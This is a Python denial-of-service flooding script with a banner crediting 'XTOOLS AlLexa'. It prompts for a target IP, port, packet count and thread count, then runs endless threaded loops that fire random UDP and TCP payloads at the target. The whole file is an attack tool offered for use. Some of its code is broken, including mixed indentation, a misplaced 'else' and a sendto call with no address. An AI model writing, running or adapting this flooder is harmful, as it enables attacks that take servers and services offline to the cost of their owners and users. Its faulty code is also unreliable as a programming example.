#!/usr/bin/env python3
import random
import socket
import threading
import os,sys


print       ("   ╔════════════════════════════════╗ ") 
print       ("   ║   WELCOME   TO COMUNITY TEAM EVERYWHERE║ ")
print       ("   ║    >> TOOLS CREATED BY XTOOLS AlLexa <<          ║ ")    
print       ("   ║    >> DON'T ABUSE MY TOOLS  <<     📦         📦     ║ ")       
print       ("   ║    >> DISCORD : AlLexa#6858  <<       📦 📦    📦    ║ ")
print       ("   ║    >> DM ME IF YOU NEED HELP  <<   📦    📦  📦  ║ ")
print       ("   ╚════════════════════════════════╝ ")


    
    
ip = str(input("  HOST/IP:"))
port = int(input(" Port:"))
choice = str(input(" Gass Entod?(y/n):"))
times = int(input(" Paket:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"Xs EVERYWHERE Menyenggol Ip %s Dan Port : %s"%(ip, port))
		except:
			print("[!] ERROR SERVER TIME OUT")

def run2():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Xs EVERYWHERE Menyenggol Ip %s Dan Port : %s"%(ip, port))
		except:
			s.close()
			print("[!] ERROR SERVER TIME OUT")
			
def run3():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Xs EVERYWHERE Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] ERROR SERVER TIME OUT") 
        
def run4():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Xs EVERYWHERE Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] ERROR SERVER TIME OUT")

def run5():
    data = random._urandom(1800)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data)
            print(i +"Xs EVERYWHERE Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            print("[!] ERROR SERVER TIME OUT") 

           
           
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
        th.start()
        th = threading.Thread(target = run3)
        th.start()
		th = threading.Thread(target = run4)
        th.start()
else:
		th = threading.Thread(target = run5)
		th.start()